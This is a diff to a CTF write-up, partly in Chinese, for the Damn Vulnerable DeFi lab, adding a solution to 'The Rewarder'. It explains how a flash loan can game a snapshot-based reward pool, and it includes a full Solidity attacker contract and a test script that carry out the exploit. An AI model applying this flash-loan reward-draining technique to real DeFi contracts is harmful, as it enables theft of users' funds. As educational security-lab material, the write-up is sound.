@@ -5,9 +5,13 @@ tags:
     - smart contract
     - DeFi
     - flashloan
+    - hardhat
+    - foundry
 ---
 
 ## How to Play
+
+### Hardhat
 
 ```bash
 $ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git
@@ -18,6 +22,17 @@ $ yarn install
 
 - Code solution in the `test/<challenge-name>/<challenge-name>.challenge.js`
 - `yarn run <challenge-name>`
+
+### Foundry
+
+```bash
+$ git clone git@github.com:StErMi/forge-damn-vulnerable-defi.git
+$ cd forge-damn-vulnerable-defi
+$ git submodule update --init --recursive
+```
+
+- Code solution under the `src/test`
+- `forge test --match-contract <test-contract-name>`
 
 ## 1. Unstoppable
 
@@ -333,3 +348,125 @@ it('Execution', async function () {
     await hacker.exploit();
 });
 ```
+
+## 5. The Rewarder
+
+> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+>
+> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+>
+> You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+>
+> By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?
+
+- `rewardToken` 的分发取决于最后一次快照
+
+    ```js
+    function distributeRewards() public returns (uint256 rewards) {
+        if (isNewRewardsRound()) {
+            _recordSnapshot();
+        }
+
+        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
+        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
+
+        if (amountDeposited > 0 && totalDeposits > 0) {
+            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
+            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
+                rewardToken.mint(msg.sender, rewards);
+                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
+            }
+        }
+    }
+    ```
+
+- 每 $5$ 天可以快照一次
+
+    ```js
+    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
+
+    function _recordSnapshot() private {
+            lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
+            lastRecordedSnapshotTimestamp = uint64(block.timestamp);
+            unchecked {
+                ++roundNumber;
+            }
+        }
+
+    function isNewRewardsRound() public view returns (bool) {
+        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+    ```
+
+- 由于不检查 `deposit/withdraw` 的时间，可在 $5$ 天后借助闪电贷 `deposit()` 创建新的快照并获得 `rewardToken`，再 `withdraw()` 归还闪电贷
+
+    ```js
+    function deposit(uint256 amount) external {
+        if (amount == 0) {
+            revert InvalidDepositAmount();
+        }
+
+        accountingToken.mint(msg.sender, amount);
+        distributeRewards();
+
+        SafeTransferLib.safeTransferFrom(
+            liquidityToken,
+            msg.sender,
+            address(this),
+            amount
+        );
+    }
+
+    function withdraw(uint256 amount) external {
+        accountingToken.burn(msg.sender, amount);
+        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
+    }
+    ```
+
+### Exploit
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "./FlashLoanerPool.sol";
+import "./TheRewarderPool.sol";
+
+contract TheRewarderHacker {
+    TheRewarderPool public immutable pool;
+    IERC20 public immutable dvt;
+
+    constructor(address instance, address token) {
+        pool = TheRewarderPool(instance);
+        dvt = IERC20(token);
+    }
+
+    function exploit(address lender, address token) external {
+        FlashLoanerPool(lender).flashLoan(1000000 ether);
+        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        dvt.approve(address(pool), amount);
+        pool.deposit(amount);
+        pool.withdraw(amount);
+        dvt.transfer(msg.sender, amount);
+    }
+}
+```
+
+```js
+it('Execution', async function () {
+    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+    const TheRewarderHackerFactory = await ethers.getContractFactory('TheRewarderHacker', player);
+    const theRewarderHacker = await TheRewarderHackerFactory.deploy(rewarderPool.address, liquidityToken.address);
+
+    await theRewarderHacker.exploit(flashLoanPool.address, rewardToken.address);
+});
+```
+
+### 参考资料
+
+- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot)
